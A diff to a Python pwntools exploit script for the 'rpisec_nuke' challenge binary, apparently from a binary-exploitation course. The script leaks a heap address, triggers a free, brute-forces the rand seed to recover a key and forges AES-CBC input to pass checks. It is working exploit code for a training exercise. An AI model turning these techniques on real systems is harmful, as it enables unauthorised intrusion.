@@ -1,20 +1,20 @@
 import ctypes
-import struct
 import sys
 
 from pwn import *
 
+import mycrypto
 
-p = process(["/levels/project2/rpisec_nuke"])
+
+p = process(["./rpisec_nuke"], env={"LD_PRELOAD": "./usleep.so"})
 log.info(util.proc.pidof(p))
-pause()
 
 # Get session ID (e.g. buf)
 p.recvuntil("LAUNCH SESSION ")
 p.recv(16)
 buf = p.recv(10)
 buf_addr = int(buf)
-log.info("Got buff address/session id 0x{:x}".format(buf_addr))
+log.info("Got buf address/session id {:#x}".format(buf_addr))
 
 # Enter and then get wrong session in key3 to trigger `free`
 p.sendline("3")
@@ -35,7 +35,6 @@ p.recvuntil("AUTHENTICATION FAILED")
 p.sendline("")
 
 # Get the challenge, xor out our key and find the seed
-p.sendline("3")
 def read_challenge():
     p.recvuntil("64 Bytes):")
     p.recv(38)
@@ -50,6 +49,7 @@ def read_challenge():
     challenge = "".join(challenge)
     return challenge
 
+p.sendline("3")
 challenge = read_challenge()
 
 p.recvuntil("TIME NOW:")
@@ -61,12 +61,12 @@ log.info("Got time now: {}".format(time_now))
 libc = ctypes.cdll.LoadLibrary("libc.so.6")
 # -- First dword is the result of the first rand() xored with the supplied
 #    plaintext from key2 (four spaces)
-first_dword = struct.unpack("<L", challenge[0:4])[0] ^ 0x20202020
+first_dword = u32(challenge[0:4]) ^ 0x20202020
 log.info("Trying to match challenge 0x{:08x}".format(first_dword))
-for seed in range(time_now - 60 + buf_addr, time_now + buf_addr):
+for seed in range(time_now - 60 + buf_addr, time_now + buf_addr + 1):
     libc.srand(seed)
     r = libc.rand()
-    log.info("Seed {} rand 0x{:08x}".format(seed, r))
+    # log.info("Seed {} rand 0x{:08x}".format(seed, r))
     if first_dword == r:
         log.info("Seed {} worked!".format(seed))
         break
@@ -79,7 +79,7 @@ enc_key = challenge[48:]
 libc.srand(seed)
 for i in range(12):
     r = libc.rand()
-crowell_key = "".join([struct.pack("<L", libc.rand() ^ struct.unpack("<L", enc_key[i*4:i*4+4])[0]) for i in range(4)])
+crowell_key = "".join([p32(libc.rand() ^ u32(enc_key[i*4:i*4+4])) for i in range(4)])
 log.info("Leaked crowell key {}".format(crowell_key.encode("hex")))
 
 p.recvuntil("YOUR RESPONSE")
@@ -96,19 +96,18 @@ p.sendline("32")
 
 # Now we want to provide data that will encrypt to a value that contains key 3's check '31337' at the start
 # of the second block. By putting nullbytes between we can still pass the key2 strcmp.
-import crypto
 
 iv = "CFFAEDFEDEC0ADDEFECABEBA0BB0550A".decode("hex")
 b1 = "KING CROWELL\x00\x00\x00\x00"
 assert len(b1) == 16
 
-ct = crypto.aes_encrypt_cbc(b1, crowell_key, iv)
+ct = mycrypto.aes_encrypt_cbc(b1, crowell_key, iv)
 ct += "\x37\x13\x03\x00" + "\x00" * 12
 assert len(ct) == 32
 
-pt = crypto.aes_decrypt_cbc(ct, crowell_key, iv)
+pt = mycrypto.aes_decrypt_cbc(ct, crowell_key, iv)
 assert pt.startswith("KING CROWELL")
-ct_again = crypto.aes_encrypt_cbc(pt, crowell_key, iv)
+ct_again = mycrypto.aes_encrypt_cbc(pt, crowell_key, iv)
 assert ct_again[16:20] == "\x37\x13\x03\x00"
 
 p.recvuntil("ENTER DATA")
